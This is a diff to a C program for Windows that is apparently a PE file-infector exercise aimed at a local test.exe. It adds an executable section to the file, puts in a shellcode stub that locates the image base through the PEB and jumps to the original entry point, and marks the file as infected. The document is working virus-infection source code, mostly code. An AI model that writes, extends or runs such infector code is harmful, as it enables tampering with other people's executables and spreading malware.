@@ -1,5 +1,7 @@
 #include <Windows.h>
 #include <winnt.h>
+#include <winternl.h>
+#include <minwindef.h>
 #include <fileapi.h>
 #include <handleapi.h>
 
@@ -41,13 +43,13 @@ inline void SetFileSize(HANDLE hFile, long size) {
 }
 
 #define BUF_SIZE (1 << 20)
-#define CODE_SIZE 12
 
 const char *TARGET = ".\\test.exe";
 char buf[BUF_SIZE];
 
-#define JMP_POINT_OFFSET 4
-char shellCode[CODE_SIZE] = {0x55, 0x8B, 0xEC, 0xB8, 0x44, 0x33, 0x22, 0x11, 0xFF, 0xE0, 0x5D, 0xC3};
+#define JMP_POINT_OFFSET 0x1C
+#define CODE_SIZE 0x26
+BYTE shellCode[CODE_SIZE] = {0x55, 0x8b, 0xec, 0x83, 0xec, 0x8, 0x64, 0xa1, 0x30, 00, 00, 00, 0x89, 0x45, 0xfc, 0x8b, 0x45, 0xfc, 0x8b, 0x48, 0x8, 0x89, 0x4d, 0xf8, 0x8b, 0x45, 0xf8, 0x5, 0x44, 0x33, 0x22, 0x11, 0xff, 0xe0, 0x8b, 0xe5, 0x5d, 0xc3};
 
 HANDLE OpenTarget() {
     HANDLE hFile = CreateFileA(
@@ -139,7 +141,7 @@ void InfectTarget(HANDLE hFile) {
     long fileAlign = pOptHdr->FileAlignment;
     long secAlign = pOptHdr->SectionAlignment; 
     // Set old entry VA
-    long oldVA = pOptHdr->AddressOfEntryPoint + pOptHdr->ImageBase;
+    long oldVA = pOptHdr->AddressOfEntryPoint;
     long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
     *jmpPoint = oldVA;
     // Calc New Section raw
@@ -165,7 +167,8 @@ void InfectTarget(HANDLE hFile) {
     pNewSecHdr->PointerToLinenumbers = 0;
     pNewSecHdr->NumberOfRelocations = 0;
     pNewSecHdr->NumberOfLinenumbers = 0;
-    pNewSecHdr->Characteristics = IMAGE_SCN_CNT_CODE;
+    pNewSecHdr->Characteristics = \
+        IMAGE_SCN_CNT_CODE | IMAGE_SCN_ALIGN_32BYTES | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
     // Set Infected tag
     pDosHdr->e_res[0] = 0x1234;
     // Fix File Header
